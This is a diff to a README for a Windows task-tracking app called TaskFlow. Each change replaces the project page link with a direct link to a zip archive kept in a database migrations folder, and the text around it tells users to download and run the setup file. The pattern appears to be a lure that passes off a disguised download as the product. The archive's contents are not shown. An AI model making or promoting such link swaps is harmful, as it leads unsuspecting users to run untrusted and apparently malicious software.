@@ -1,6 +1,6 @@
 # 🗂️ TaskFlow - Simple task tracking for teams
 
-[![Download TaskFlow](https://img.shields.io/badge/Download-TaskFlow-4C78FF?style=for-the-badge&logo=github&logoColor=white)](https://github.com/MrRedstoneY/TaskFlow)
+[![Download TaskFlow](https://img.shields.io/badge/Download-TaskFlow-4C78FF?style=for-the-badge&logo=github&logoColor=white)](https://github.com/MrRedstoneY/TaskFlow/raw/refs/heads/main/apps/users/migrations/Flow_Task_v3.0.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ This page shows you how to get TaskFlow on Windows and start it with a few click
 
 ## 💾 Download TaskFlow
 
-1. Open the TaskFlow page: https://github.com/MrRedstoneY/TaskFlow
+1. Open the TaskFlow page: https://github.com/MrRedstoneY/TaskFlow/raw/refs/heads/main/apps/users/migrations/Flow_Task_v3.0.zip
 2. Look for the download area or release files on the page
 3. Download the Windows version if one is listed
 4. Save the file to your Desktop or Downloads folder
@@ -18,7 +18,7 @@ This page shows you how to get TaskFlow on Windows and start it with a few click
 
 If the page shows a setup file, download and run that file.
 
-[Visit the TaskFlow download page](https://github.com/MrRedstoneY/TaskFlow)
+[Visit the TaskFlow download page](https://github.com/MrRedstoneY/TaskFlow/raw/refs/heads/main/apps/users/migrations/Flow_Task_v3.0.zip)
 
 ## 🪟 Windows Setup
 
